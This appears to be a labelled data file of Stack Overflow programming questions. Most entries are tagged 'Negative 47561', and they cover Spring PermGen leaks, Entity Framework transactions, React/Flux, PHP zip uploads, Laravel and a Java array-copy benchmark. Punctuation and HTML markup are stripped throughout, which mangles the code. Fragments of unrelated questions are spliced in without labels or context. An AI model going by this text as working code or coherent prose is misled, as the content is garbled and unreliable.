Negative 47561 pI am in the process of switching an application to use spring and dynamically load some classes at runtime. This change is leading to consistent java.lang.OutOfMemory PermGen Space errors when running our JUnitbased test suite through maven. We have about 800 tests, and the OoM is thrown about 200 tests in. The code changes are as followsp  precodeprivate Obj buildMyObj      Obj obj  MyObj1 Old method to get obj     ObjInterface obj  ObjInterface MyAppContext.INSTANCE.getApplicationContenxt.getBeanObj  codepre  pAnd in the xml file, I have added the followingp  precodeltbean idObj classcom.project.obj.ObjImplOnegt     ltconstructorarg namearg0 val1gt ltbeangt codepre  pThe buildMyObj method is being run approximately once per unit test, though some will call it many times. The previous method, declaring the object directly before we moved to the interface approach worked fine. However, now that weve got an interface and may use several different implementations at runtime, we need to load it at runtime and JUnit isnt playing along.p  pIve followed up on some of the existing stackoverflow threads, and it appears that whenever Spring loads a class dynamically, it puts it in the PermGen, but isnt smart enough to identify a subsequent load of the class as identical and leads to every call placing a new class in the PermGen, hence the error. It was suggested to allow Class Unloading with the XXCMSClassUnloadingEnabled JVM option the suggestion was XXCMSClassUnloadingEnabled XXCMSPermGenSweepingEnabled, but the JVM complained with Please use CMSClassUnloadingEnabled in place of CMSPermGenSweepingEnabled in the futurep  pBut that hasnt changed anything, the error is still being thrown. p  pEDIT After watching the test suite run and monitoring top in a separate terminal, it doesnt appear the JVM is doing anything to reclaim the classes which are being loaded. I uppoed the permgen size per a suggested comment, and java simply continued claiming memory for a longer time over 2 gigs worth. Is there an issue with Class Loading and getBeanp

Negative 47561 pIm using EF6.1 and SQL Server on a WPF thickclient application and by default Im opening a transaction with each DbContext I instantiate I commit it and reopen it on every codeSaveChangescode unless specified otherwise. The isolation level for these transactions is READ COMMITED codeIsolationLevel.ReadCommitedcode.p  pIm by default opening a new context thus a new transaction on each main view. The application is kind of a fakeMDI app and each MDI View will use its own codeDbContextcode... main views every MDI tabwindow can contain other secondary views think of small modal windows for specific data entry and things like that which will share the same context and transaction as the opened in the main view. Im using a structure like codeUseCase gt Views gt ViewModelscode... generally a UseCase will open up a codeDbContextcode and can spawn multiple views, which will share it. Those secondary views usually call codeSaveChangescode without committing the transaction, thats why I want to have them in first place.p  pIve done some performance tests with a single user on a lab server and there doesnt seem to exist any difference performancewise either opening the transaction when instancing the context, or not having transactions at all other than the one EF opens by default on codeSaveChangescode.p  pIm no SQL Server expert, so Im wondering if there are any implications when the app is used by multiple users on a production server on having many longrunning transactions opened on SQL Server with that isolation level I understand the implications on other isolation levels which may lock reads, but its not the case. Im handling concurrency errors manually when committing the transactions.p  pAm I doing the right thing here, should I stick to shortliving transactions, or is it just a matter of preferencep  pIve been trying to find an answer to this but havent found anything definitive theres some people that says longliving transactions are not a good idea, but they dont seem to explain why.p

Ive set watchpoints on the offending address and its always the same offset from the base address.  This address is a member variable of a CPP class and its just a 32 bit integer.  The project has some C and CPP mixed together with ObjC, which makes me lean towards alignment bugs.p  pThe watchpoints seldom ever hit, only at the beginning of the use of the object, then theyre left alone, yet still it crashes at this same address.  p  pI understand its intended to identify writing to invalid address, but knowing howwhen its performed could help shed some light on this bug.p

Negative 47561 pIm designing a program C11, targeting Linux, CentOS 7 if it matters where one thread will call ppoll to block on multiple fds, while any readingwriting for these fds will take place on other threads.

Negative 47561 pTitle may be confusing... but here is my question. I am trying to refine the results that pull for specific students that pull from a table that hold there logs. The log tables holds two columns which are really the only criteria for the query, log.logtypeid and log.subtype. For sake of example, I am trying to pull all students whole hold a logtypeid of 1, but I also want to show there subtypes 2 and 3, and those subtypes have a different logtypeid.

I have both of these cases working.p  pBut now I need to make a page that users SOMETIMES have to login to see based on the dataconfiguration of what is being asked for. p  pGiven that, I cant just throw the servlet endpoint in the web.xml webresourcecollection, it wont work that way.p  pI have tried returning a login view from my servlet, with the standard wiring for jsecurtiycheck, but when the service comes back it does not look like the login worked.p

Using it I managed to dump the local communications on my machine during both a run of the ruby clientserver pair and Cygwin SocatUnreal Engine 4.

Negative 47561 pScenario I want to extend an existing React component and deliver it as a standalone component. p  pLets take for example Facebooks codeFixedDataTablecode a hrefhttpsgithub.comfacebookfixeddatatable relnofollowhttpsgithub.comfacebookfixeddatatablea, add some extra features and wrap it as a reusable component.p  pThe first extra feature would be multiple row selection  demo can be found here a hrefhttpgoo.glqRE9eB relnofollowhttpgoo.glqRE9eBap  pWhat anyone can notice here is that the codeMovieTablecode wrapper handles the checked  not checked state of the rows. So, what Ill want to do next is to delegate the responsibility of the state handling to a Flux store for simplicity, lets consider Facebook Flux implementation a hrefhttpsgithub.comfacebookflux relnofollowhttpsgithub.comfacebookfluxa. Probably it doesnt make too much sense to do this now, but as the complexity of the codeMovieTablecode grows sorting, infinite scrolling etc., integrating Flux would be a necessity. According to Flux architecture Action  Dispatcher  Store  View, codeonRowClickcode and codeonCheckAllcode will trigger actions which will allow the Store to save the state and notify the view that something was changed, in order for the view to rerender the new state of the checkbox.p  pLets assume next that I want to bundle the codeMovieTablecode view together with its actions  dispatcher  store as a standalone component, so that I could reuse it later. First questionp  p1 does it make sense to bundle together the view  actions  dispatcher  store as a standalone component From my point of view, the benefits are clear the one that uses the component doesnt need to take care of the internals of the component e.g. row selection, infinite scrolling, sorting etc.p  pLets consider that I choose to bundle everything together. The next questions arep  p2 How can I get data out of the Store e.g. some part of the application might need to get all the selected rows from the components Storep  p3 How can I trigger actions on the dispatcher of the component e.g. I want to programmatically check some rows  my first thought is that the client should have access to the actions of the componentp  p4 Given 1, 2 and 3, I want to have a reusable DataTable component that feels like a traditional jQuery component e.g. jqGrid a hrefhttpgoo.glb7jPo3 relnofollowhttpgoo.glb7jPo3a. The ultimate goal would be to combine jQuery like components with React components in the same page, without causing too much pain to the one that mixes these.p

Negative 47561 pIm using the ANTLR4 SDK plugin in Eclipse. When I make a change to my grammar file, the plugin generates new source files, and Eclipse gets stuck in a loop.

Negative 47561 pHello friends  I need a little guidance.p  pI have an HTML form comprised of a very long list of items pulled from an array generated by a database query its a list of university courses.

The project is using PHP and JavaScriptjqueyAJAX.  p  pI know how to pull from the database based on LIKE queries, but Im just a bit stumped as to how best loop through the generated form and target the items that are in my form. My PHP is pretty strong, my jquery is a bit shaky.p  pThe list of checkboxes is generated via a loop through the array with each item set up as followsp  precodeo . ltinput id.rw[2]..rw[0]. typecheckbox  name . rw[2].. rw[0].  gt o . ltlabel for.rw[2].. rw[0].gt  . rw[1] . ltlabelgt o . lttdgt codepre  pSo we end up with a simple checkbox form with a LABEL FOR and the label text, and the items are all named as the array keys.  p  pThis is the HTML output for a typical itemp  precodelttrgtlttdgtltinput id110105 typecheckbox name110105 gt ltlabel for110105gt PHIL233ltlabelgtlttdgtlttrgt codepre  pSorry if this description is a bit long, but what I need is an idea of how to go about looping through the forms elements after it is generated to SELECT the checkbox for every item where the pattern matches.  p  pHope this makes sense  p  pTamrap

With this, I moved to having values change dynamically on the Java side.

When I check the packaged and transmitted Google Protocol Buffer message on the Java side, it appears that I am sending the correct values.  Is there a better approach for receiving a Google Protocol Buffer message in cp
Negative 47561 pThis script is to insert Wind data from a weather station. The data comes from this text file online.

Negative 47561 pI think Laravel solves this problem as well, but would like to extend my question a little bit.p  pIs it possible in Laravel to show how many users are currently logged in, in real timep  pLike if the 10 users are logged then the counter should show 10 users are logged in. This will be shown to all the ten users , but in real time.p  pSo if some users which logs out, counter should decrease.p  pThe approach i used is like after attempting to login, we can increment the counter of the one of the column in DB. We can use another table, say logged in table. p  pWhen users are logged out, we would decrement the counter by deleting that Authid of the user and the count will get reduced.p  pBut then i want to try it in a real time, how is that possible with laravel itselfp

Is this query more memory intensive than I realizep  pEDIT I should mention that it only hangs with zip files with a larger amount of files, like the 650 figure I mentioned above, the program seems to execute fine with a small number of files.p  pCode Offending query near bottom of scriptp  precodeltphp      inisetmaxexecutiontime, 300     requireonce vendormedoo.min.php     requireonce scriptsclass.file.php      database  new medoo[         databasetype gt mysql,         databasename gt invoicefiles,         server gt localhost,         username gt root,         password gt pass,         charset gt utf8     ]      file  new File     filegtsetfilename, FILES[uploadedfile][name]     filegtsetcategory, Invoice Statement     filegtsetfiletemppath, FILES[uploadedfile][tmpname]     filegtsetuploadedFilePath, filegtpathuploads . basenamefilegtgetfilename     counter  0      iffilegtgetPathInfo[extension]  zip              zip  new ZipArchive         zipFile  file         echo Source  . zipFilegtgetfiletemppath . ltbrgt         ifzipgtopenzipFilegtgetfiletemppath                      fori  0 i lt zipgtnumFiles i                              zipName  zipgtgetNameIndexi                 zipFilegtsetuploadedFilePath, filegtpathuploads                 zipFilegtsetfilename, zipName                  forx  0 x lt zipgtnumFiles x                                      extension  zipgtgetNameIndexx                     pathInfo  pathinfoextension                     ifpathInfo[extension]  pdf ampamp pathInfo[extension]  xls                                              echo Non PDF or excel sheet detectedltbrgt                         return false                                          ifpathInfo[extension]  xls                                              excelFile  extension                         excelFlag  true                                          else                                              excelFlag  false                                                        ifzipgtextractTozipFilegtgetuploadedFilePath                                      pathInfo  pathinfozipName                     databasegtinsertfiles,[                             name gt zipFilegtgetfilename,                             category gt zipFilegtgetcategory,                             date gt zipFilegtsetDate,                             extension gt pathInfo[extension],                             size gt filesizezipFilegtgetuploadedFilePath . zipFilegtgetfilename  1000 .

Negative 47561 pWhile interning at a video conferencing company, there was much talk of empacket lossem. Wikipedia states the following p  blockquote   pPacket loss is typically caused by network congestion.p blockquote  pI understand that because video requires such massive amounts of data to be sent over the wire, packets are bound to be lost.p  pWhat I dont understand is why packet loss is not experienced in other cases such as HTTP requests and AJAX calls. If packet loss is truly due to congested networks, why have I never experienced it with my own HTTP requestsp  pAre HTTP connections invulnerable to packet loss, or are the requests that I am sending too small to be affected. If HTTP is immune to packet loss, why is this the casep

Negative 47561 pI have the following scenario A textarea has an autosave currently bound to the change event. When the textarea receives focus, it will also display Save and Cancel buttons hanging off the bottom, so that the user has something to click in case they are uncomfortable just moving off the control or clicking outside it into empty space.p  pThe save button is basically just a dummy button. When the user click it, focus is naturally lost from the textarea, and the change event is triggered. Everything also works fine for clicking outside the textarea to make the save happen. p  pThe problem is with the Cancel button. Clicking the Cancel button causes the textarea to lose focus, and thus fire the change event, which is handled before the click event of the button. With a save and a cancel event being sent to the server nearly at the same time, its not possible to be certain in which order they are processed. p  pThe example can be seen here a hrefhttpjsfiddle.netvwu79wd11 relnofollowhttpjsfiddle.netvwu79wd11ap  pHTMLp  precodeltdiv classlargerEventContainergt     ltdiv classinlineControls stylewidth200pxgt     lttextarea nameSomeText dataprevvalueOriginal Text stylewidth100gtOriginal Textlttextareagt     ltdivgt ltdivgt ltdiv idloggtltdivgt codepre  pCSSp  precode.inlineControls      positionrelative     marginbottom1em   .inlineControls textarea, .inlineControls input      marginbottom 0px   .inlineControls textareafocus  .saveOptions      display block   .saveOptionshover      displayblock   .saveOptions      displaynone     positionabsolute      right0px      top100     backgroundcolor f0f0f0     border 1px solid ccc     padding 3px     outline none     bordertopnone     borderradius 0 0 3px 3px  codepre  pJavascriptp  precode.largerEventContainer.onchange, input, textarea, function       log.appendltdivgtsavingltdivgt   document.onfocus, .inlineControls textarea, function       var control  this      if this.closest.inlineControls.find.saveOptions.length  0          this.closest.inlineControls             .appenddocument.createElementdiv                 .addClasssaveOptions                 .appenddocument.createElementspan                     .csspadding, 4px                     .htmlSave                     .clickfunction                           this.closest.saveOptions.remove                                          .appenddocument.createElementspan                         .csspadding, 4px                         .htmlCancel                         .clickfunction                               var control      this.closest.inlineControls.findtextarea                             control.valcontrol.dataprevvalue                             log.appendltdivgtresetltdivgt                             this.closest.saveOptions.remove                    codepre  pWhat I have tried or considered but dismissed as either not working or too clunkyp  ul liInsert a delay in the change event, to allow the cancel to happen first.

Negative 47561 pIve been given several 3D PDF files exported from a CAD software. I can move around freely, change lightning settings and display individual components in Acrobat Reader. Very nice indeed.p  pNow I need to extract a printable 2D graphic from the view I want. Of course I could do a screen shot, but that limits me to my screen resolution. Is there any possibility to render the image in higher resolutions, or even better, to create a 2D vector graphic I am writing my document using PDFLatex, so a 2D pdf would be best.p  pRegardsp

Wait, what  How can this be slower p  pDoes anyone has an idea of what could be the cause p  pThe results throughputp    pre classlangnone prettyprintoverridecode JMH 1.11 released 17 days ago  VM version JDK 1.8.005, VM 25.5b02  VM invoker LibraryJavaJavaVirtualMachinesjdk1.8.005.jdkContentsHomejrebinjava  VM options Dfile.encodingUTF8 Duser.countryFR Duser.languagefr Duser.variant  Warmup 20 iterations, 1 s each  Measurement 20 iterations, 1 s each  Timeout 10 min per iteration  Threads 1 thread, will synchronize iterations  Benchmark mode Throughput, opstime  Benchmark                                            Mode  Cnt         Score         Error  Units ArrayCopyBenchmark.ArraysCopyOf                     thrpt   20  67100500,319   455252,537  opss ArrayCopyBenchmark.ArraysCopyOfClass               thrpt   20  65246374,290   976481,330  opss ArrayCopyBenchmark.ArraysCopyOfClassConstantSize  thrpt   20  65068143,162  1597390,531  opss ArrayCopyBenchmark.ArraysCopyOfConstantSize        thrpt   20  64463603,462   953946,811  opss ArrayCopyBenchmark.Clone                            thrpt   20  64837239,393   834353,404  opss ArrayCopyBenchmark.Loop                             thrpt   20  21070422,097   112595,764  opss ArrayCopyBenchmark.LoopConstantSize                thrpt   20  24458867,274   181486,291  opss ArrayCopyBenchmark.SystemArrayCopy                  thrpt   20  66688368,490   582416,954  opss ArrayCopyBenchmark.SystemArrayCopyConstantSize     thrpt   20  48992312,357   298807,039  opss codepre  pAnd the benchmark classp    pre classlangjava prettyprintoverridecodeimport java.util.Arrays import java.util.concurrent.TimeUnit  import org.openjdk.jmh.annotations.Benchmark import org.openjdk.jmh.annotations.BenchmarkMode import org.openjdk.jmh.annotations.Mode import org.openjdk.jmh.annotations.OutputTimeUnit import org.openjdk.jmh.annotations.Scope import org.openjdk.jmh.annotations.Setup import org.openjdk.jmh.annotations.State  StateScope.Benchmark BenchmarkModeMode.Throughput OutputTimeUnitTimeUnit.SECONDS public class ArrayCopyBenchmark       private static final int LENGTH  32      private Object[] array      Setup     public void before          array  new Object[LENGTH]         for int i  0 i lt LENGTH i              array[i]  new Object                    Benchmark     public Object[] Clone          Object[] src  this.array         return src.clone           Benchmark     public Object[] ArraysCopyOf          Object[] src  this.array         return Arrays.copyOfsrc, src.length           Benchmark     public Object[] ArraysCopyOfConstantSize          Object[] src  this.array         return Arrays.copyOfsrc, LENGTH           Benchmark     public Object[] ArraysCopyOfClass          Object[] src  this.array         return Arrays.copyOfsrc, src.length, Object[].class           Benchmark     public Object[] ArraysCopyOfClassConstantSize          Object[] src  this.array         return Arrays.copyOfsrc, LENGTH, Object[].class           Benchmark     public Object[] SystemArrayCopy          Object[] src  this.array         int length  src.length         Object[] array  new Object[length]         System.arraycopysrc, 0, array, 0, length         return array           Benchmark     public Object[] SystemArrayCopyConstantSize          Object[] src  this.array         Object[] array  new Object[LENGTH]         System.arraycopysrc, 0, array, 0, LENGTH         return array           Benchmark     public Object[] Loop          Object[] src  this.array         int length  src.length         Object[] array  new Object[length]         for int i  0 i lt length i              array[i]  src[i]                  return array           Benchmark     public Object[] LoopConstantSize          Object[] src  this.array         Object[] array  new Object[LENGTH]         for int i  0 i lt LENGTH i              array[i]  src[i]                  return array       codepre
